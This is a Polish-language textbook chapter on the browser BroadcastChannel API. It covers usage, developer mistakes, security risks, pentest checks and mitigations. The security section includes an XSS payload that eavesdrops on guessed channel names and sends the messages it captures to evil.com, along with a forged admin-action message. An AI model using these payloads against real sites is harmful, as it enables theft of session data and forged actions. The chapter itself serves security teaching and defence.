# Rozdział 22: BroadcastChannel

## 1. Czym jest BroadcastChannel

**BroadcastChannel** to API umożliwiające **komunikację między kontekstami przeglądania** (kartami, oknami, iframes, Workers) tego samego origin poprzez prosty publish-subscribe mechanizm. Każde okno/karta które dołączy do kanału o tej samej nazwie otrzymuje wiadomości wysłane przez inne konteksty.

Jest to uproszczona alternatywa dla Shared Workers gdy potrzebna jest tylko komunikacja (bez shared computations):
- Prosty interfejs: `new BroadcastChannel(name)`, `.postMessage()`, `.onmessage`
- Nie wymaga oddzielnego pliku Workera
- Natychmiastowa komunikacja (nie wymaga ustanawiania połączenia)
- Obsługiwany w Workers (Dedicated, Shared, Service Workers)
- Izolacja per-origin

---

## 2. Dlaczego powstał

### Problem: brak prostego cross-tab messaging

Przed BroadcastChannel cross-tab komunikacja wymagała:
- `localStorage` + `StorageEvent` — hackish, tylko stringi, trigger tylko gdy zmiana
- `Shared Workers` — skomplikowane API z portami, wymaga oddzielnego pliku
- `Service Workers` + `postMessage` — overengineered dla prostych przypadków

BroadcastChannel (2015, Living Standard) dostarcza prostego mechanizmu pub-sub bez tych kompromisów:

```javascript
// localStorage hack (stary sposób):
localStorage.setItem('msg', JSON.stringify({ action: 'logout' }));
window.addEventListener('storage', (e) => {
    if (e.key === 'msg') handleMessage(JSON.parse(e.newValue));
});

// BroadcastChannel (nowoczesny sposób):
const channel = new BroadcastChannel('app');
channel.postMessage({ action: 'logout' });
channel.onmessage = ({ data }) => handleMessage(data);
```

---

## 3. Jak działa

### Model komunikacji

```
Karta 1                    Karta 2                    Karta 3
    │                          │                          │
new BC('auth')           new BC('auth')           new BC('auth')
    │                          │                          │
    │                          │                    ┌─────┘
    │    BroadcastChannel('auth') — kanał           │
    │    ┌──────────────────────────────────────────┐
    │    │  Wszystkie okna w tym samym origin       │
    │    │  z tym samym name są w jednym kanale     │
    └────┤                                          │
         │                                          │
         │ channel.postMessage({action: 'logout'}) ─►│ onmessage (Karta 2)
                                                    │ onmessage (Karta 3)
                                                    │ NIE: Karta 1 (nadawca)
```

**Kluczowe:** Nadawca **nie** otrzymuje własnej wiadomości. Wiadomości dostają tylko inne konteksty.

### API

```javascript
// Tworzenie kanału
const channel = new BroadcastChannel('my-channel');

// Wysyłanie (do wszystkich innych kontekstów z tym samym name)
channel.postMessage('hello');
channel.postMessage({ type: 'update', data: { id: 42 } });

// Odbieranie
channel.onmessage = (event) => {
    console.log('Otrzymano:', event.data);
    console.log('Origin:', event.origin); // zawsze same-origin!
};

channel.onmessageerror = (event) => {
    console.error('Błąd deserializacji:', event);
};

// Zamknięcie kanału (nie wysyła powiadomienia do innych)
channel.close();
```

### Typ danych

BroadcastChannel używa **Structured Clone Algorithm** — obsługuje obiekty, tablice, Date, Map, Set, ArrayBuffer. Nie obsługuje funkcji ani DOM nodes.

### Dostępność w Workers

```javascript
// BroadcastChannel działa w:
// - window (strona)
// - Dedicated Worker
// - Shared Worker
// - Service Worker

// W Service Worker:
self.addEventListener('install', () => {
    const channel = new BroadcastChannel('sw-updates');
    channel.postMessage({ type: 'installing', version: '2.0' });
});
```

---

## 4. Co dzieje się wewnętrznie

### IPC przez przeglądarkę

BroadcastChannel jest implementowany przez **Inter-Process Communication (IPC)** przeglądarki. W Chrome każda karta może być w osobnym procesie (Site Isolation). BroadcastChannel używa IPC mechanizmu przeglądarki do przekazywania wiadomości między procesami renderera.

To jest szybkie i niezawodne, ale asynchroniczne — `postMessage` wraca natychmiast, dostawa wiadomości może zająć kilka milisekund.

### Izolacja per-origin

Kanały są izolowane per-origin. Karta na `app.example.com` i karta na `api.example.com` nie mogą komunikować się przez BroadcastChannel nawet jeśli mają ten sam name kanału.

---

## 5. Analogiczny przykład z życia

BroadcastChannel to kanał radio w firmie:

- Wszyscy pracownicy (karty) na tym piętrze (origin) z odbiornikiem (BroadcastChannel) na tym samym kanale (name) słyszą to samo
- Gdy ktoś mówi do mikrofonu (postMessage) → wszyscy inni słyszą
- Ale mówca nie słyszy własnego głosu przez głośnik (nadawca nie dostaje własnej wiadomości)
- Pracownicy z innego piętra (inny origin) nie słyszą — inny kanał radiowy (izolacja)

---

## 6. Przykład kodu

```javascript
// === Wzorzec: synchronizacja auth state między kartami ===

// auth-sync.js — moduł używany w każdej karcie
class AuthSync {
    constructor() {
        this.channel = new BroadcastChannel('auth-state');
        this.channel.onmessage = this._handleMessage.bind(this);
    }
    
    // Wysyła do innych kart
    broadcastLogin(user) {
        this.channel.postMessage({
            type: 'LOGIN',
            user: { id: user.id, name: user.name }
            // NIGDY: token, password, sensitive data
        });
    }
    
    broadcastLogout() {
        this.channel.postMessage({ type: 'LOGOUT' });
    }
    
    broadcastSessionExpired() {
        this.channel.postMessage({ type: 'SESSION_EXPIRED' });
    }
    
    _handleMessage({ data }) {
        switch (data.type) {
            case 'LOGIN':
                // Inna karta zalogowała się — odśwież UI
                updateUserUI(data.user);
                break;
            case 'LOGOUT':
                // Inna karta wylogowała — wyloguj też tę
                performLocalLogout();
                window.location.href = '/login';
                break;
            case 'SESSION_EXPIRED':
                showSessionExpiredBanner();
                break;
        }
    }
    
    destroy() {
        this.channel.close();
    }
}

const authSync = new AuthSync();

// Przy wylogowaniu:
async function logout() {
    await fetch('/api/logout', { method: 'POST', credentials: 'same-origin' });
    authSync.broadcastLogout(); // powiadom inne karty
    performLocalLogout();
    window.location.href = '/login';
}
```

---

## 7. Przykład z prawdziwej aplikacji

### Service Worker → strona: powiadomienie o aktualizacji

```javascript
// sw.js — Service Worker informuje karty o nowej wersji
const channel = new BroadcastChannel('sw-lifecycle');

self.addEventListener('install', () => {
    channel.postMessage({ type: 'SW_INSTALLING', version: '2.1.0' });
    self.skipWaiting();
});

self.addEventListener('activate', () => {
    channel.postMessage({ type: 'SW_ACTIVATED', version: '2.1.0' });
    self.clients.claim();
});

// W karcie:
const swChannel = new BroadcastChannel('sw-lifecycle');
swChannel.onmessage = ({ data }) => {
    if (data.type === 'SW_ACTIVATED') {
        showUpdateBanner('Dostępna nowa wersja. Odśwież stronę.');
    }
};
```

### Real-time dashboard — synchronizacja między kartami

```javascript
// Aplikacja analityczna z wieloma kartami
const dashboardChannel = new BroadcastChannel('dashboard-updates');

// Karta która dostała WebSocket message — rozgłasza do innych kart
websocket.onmessage = ({ data }) => {
    const update = JSON.parse(data);
    dashboardChannel.postMessage(update);
    applyUpdate(update); // też lokalnie
};

// Inne karty odbierają aktualizację
dashboardChannel.onmessage = ({ data }) => {
    applyUpdate(data.update);
};
```

---

## 8. Typowe błędy programistów

### Błąd 1: Wysyłanie wrażliwych danych

```javascript
// BŁĄD: token JWT w BroadcastChannel
channel.postMessage({
    type: 'LOGIN',
    token: 'eyJhbGciOiJIUzI1NiJ9...' // NIGDY!
});
// Każda karta z tym kanałem (w tym skompromitowane przez XSS) dostaje token

// POPRAWKA: wysyłaj tylko non-sensitive state
channel.postMessage({
    type: 'LOGIN',
    userId: user.id,     // OK: identyfikator
    username: user.name  // OK: wyświetlana nazwa
    // token przechowuj per-tab lub w HttpOnly cookie
});
```

### Błąd 2: Brak close() → wyciek

```javascript
// BŁĄD: BroadcastChannel nigdy nie zamknięty
class Component {
    constructor() {
        this.channel = new BroadcastChannel('updates'); // leak!
    }
    destroy() {
        // brak channel.close()
    }
}

// POPRAWKA:
class Component {
    constructor() {
        this.channel = new BroadcastChannel('updates');
    }
    destroy() {
        this.channel.close(); // zawsze zamknij!
    }
}
```

### Błąd 3: Assumpcja że wiadomość dotrze natychmiast

```javascript
// BŁĄD: założenie synchronicznej dostawy
channel.postMessage({ type: 'LOGOUT' });
window.location.href = '/login'; // może załadować nową stronę PRZED dostarczeniem!
// Inne karty mogą nie dostać wiadomości

// POPRAWKA: poczekaj chwilę lub użyj innego mechanizmu dla krytycznych wiadomości
channel.postMessage({ type: 'LOGOUT' });
await new Promise(r => setTimeout(r, 50)); // daj czas na dostawę
window.location.href = '/login';
```

---

## 9. Znaczenie dla bezpieczeństwa

### BroadcastChannel jako cross-tab attack vector

BroadcastChannel jest dostępny dla dowolnego skryptu na tym samym origin. XSS może:

1. **Nasłuchiwać** na wszystkich kanałach (musi znać nazwę)
2. **Wysyłać** fałszywe wiadomości do innych kart

```javascript
// XSS payload — podsłuchiwanie BroadcastChannel
// Atakujący nie zna nazwy kanału — musi zgadnąć lub znaleźć w kodzie JS
const commonChannels = ['auth', 'auth-state', 'app', 'session', 'user', 'notifications'];

commonChannels.forEach(name => {
    const channel = new BroadcastChannel(name);
    channel.onmessage = ({ data }) => {
        fetch('https://evil.com/bc?ch=' + name + '&d=' + btoa(JSON.stringify(data)), {
            mode: 'no-cors'
        });
    };
});
```

```javascript
// XSS payload — fałszywe wiadomości (CSRF-like przez BroadcastChannel)
// Jeśli aplikacja zaufała wiadomościom z BroadcastChannel bez weryfikacji:
const channel = new BroadcastChannel('app');
channel.postMessage({ type: 'ADMIN_ACTION', action: 'deleteUser', id: 42 });
// Inna karta z uprawnieniami admina może wykonać akcję!
```

### Nie ma weryfikacji nadawcy

BroadcastChannel nie ma żadnego mechanizmu weryfikacji **kto** wysłał wiadomość. `event.origin` zawsze wskazuje ten sam origin (same-origin requirement), ale nie wskazuje konkretnej karty ani czy nadawca jest zaufany.

**Wniosek:** Nigdy nie wykonuj ważnych akcji na podstawie samej wiadomości z BroadcastChannel bez dodatkowej walidacji (np. weryfikacji przez API).

### Wiadomości nie są szyfrowane

BroadcastChannel używa IPC przeglądarki — wiadomości nie są szyfrowane. Inne karty tego samego origin widzą wszystkie wiadomości. XSS na **dowolnej** karcie origin = dostęp do wiadomości BroadcastChannel.

### Powiązane CWE

- **CWE-79** — XSS (wektor podsłuchu BroadcastChannel)
- **CWE-284** — Improper Access Control (cross-tab)
- **CWE-602** — Client-Side Enforcement of Server-Side Security

---

## 10. Jak identyfikować podczas pentestu

### Szukanie w source

```javascript
// Grep za BroadcastChannel w JavaScript bundle:
// new BroadcastChannel(
// Sprawdź nazwy kanałów → będziesz mógł nasłuchiwać

// W źródle strony (DevTools → Sources lub Network):
// Szukaj: BroadcastChannel, postMessage, channel.onmessage
```

### DevTools Console — nasłuchiwanie

```javascript
// Podsłuchaj wszystkie kanały które znajdziesz w kodzie
const bc = new BroadcastChannel('auth-state');
bc.onmessage = (e) => console.log('[BroadcastChannel auth-state]', e.data);

// Sprawdź czy logout jest synchronizowany
// (otwórz nową kartę, wyloguj z jednej → czy druga też wylogowuje?)
```

### Network Traffic

BroadcastChannel nie generuje ruchu HTTP — komunikacja jest przez IPC przeglądarki. Nie zobaczysz wiadomości w Burp Suite.

---

## 11. Jak testować bezpieczeństwo

```
□ Czy BroadcastChannel zawiera wrażliwe dane (tokeny, hasła)?
□ Czy aplikacja weryfikuje nadawcę wiadomości BC (brak weryfikacji = risk)?
□ Czy XSS może podsłuchać kanały (znajdź nazwy kanałów w kodzie)?
□ Czy XSS może wysłać fałszywe wiadomości do innych kart?
□ Czy ważne akcje są wykonywane wyłącznie na podstawie BC message (bez API validation)?
□ Czy kanały są zamykane przy wylogowaniu?
□ Czy wylogowanie jest synchronizowane przez BC i faktycznie działa?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz: XSS → podsłuchanie auth channel → token hijacking

```
Kontekst: Aplikacja bankowa używa BC('auth') do synchronizacji tokenu odświeżania między kartami.

1. XSS na bank.com/news
2. Payload nasłuchuje BC('auth')
3. Inna karta (bank.com/account) wysyła przez BC nowy access token
4. XSS payload odbiera token i eksfiltruje
5. Atakujący używa tokenu do API calls
```

### Scenariusz: Fałszywy logout broadcast

```
Kontekst: Inna aplikacja na tym samym origin (np. legacy app) obsługuje logout przez BC.

1. XSS na origin (dowolna strona)
2. Payload wysyła { type: 'LOGOUT' } do BC('auth')
3. Wszystkie karty użytkownika wylogowują się
4. DoS — uniemożliwia korzystanie z aplikacji
```

---

## 13. Jak się zabezpieczać

```javascript
// 1. Nigdy nie przesyłaj tokenów ani sekretów przez BC
// Tylko non-sensitive state: userId, username, event types

// 2. Weryfikuj przez API ważne akcje
bc.onmessage = async ({ data }) => {
    if (data.type === 'LOGOUT') {
        // Nie wylogowuj tylko na podstawie BC — zweryfikuj z API
        const valid = await fetch('/api/session-status').then(r => r.json());
        if (!valid.active) performLogout();
    }
};

// 3. Używaj nieprzewidywalnych nazw kanałów
// Zamiast 'auth' → 'auth-' + randomToken (zapisany w sessionStorage per-tab)
const channelName = 'auth-' + sessionStorage.getItem('channelSecret');
const bc = new BroadcastChannel(channelName);
// Atakujący nie zna nazwy kanału → nie może nasłuchiwać

// 4. Dodawaj timestamp i ekspirację
bc.postMessage({
    type: 'UPDATE',
    data: payload,
    timestamp: Date.now(),
    nonce: crypto.randomUUID()
});

bc.onmessage = ({ data }) => {
    // Odrzuć stare wiadomości (replay protection)
    if (Date.now() - data.timestamp > 5000) return;
    handleMessage(data);
};
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. BroadcastChannel = prosty pub-sub między kartami tego samego origin
2. Nadawca nie dostaje własnej wiadomości
3. Używa Structured Clone — obsługuje złożone typy
4. Brak weryfikacji nadawcy — każdy skrypt na origin może słuchać i wysyłać
5. Główne zagrożenia: XSS może podsłuchiwać i wysyłać fałszywe wiadomości

**Dla pentestera:**
- Znajdź nazwy kanałów w źródle JS
- Nasłuchuj kanałów w DevTools Console
- Sprawdź czy wysyłane są wrażliwe dane (tokeny, stan sesji)
- Sprawdź czy fałszywe wiadomości BC mogą wywołać ważne akcje

---

## Powiązania

```
BroadcastChannel
    │
    ├──► Shared Workers (Rozdział 21)
    │         Alternatywa — shared computations + komunikacja
    │         BC prostsze gdy potrzeba tylko komunikacji
    │
    ├──► postMessage (Rozdział 23)
    │         postMessage = point-to-point; BC = broadcast (1 → wiele)
    │
    ├──► Service Workers (Rozdział 19)
    │         SW może używać BC do informowania kart o aktualizacjach
    │
    └──► localStorage + StorageEvent
              Stary pattern cross-tab komunikacji — BC go zastępuje
```
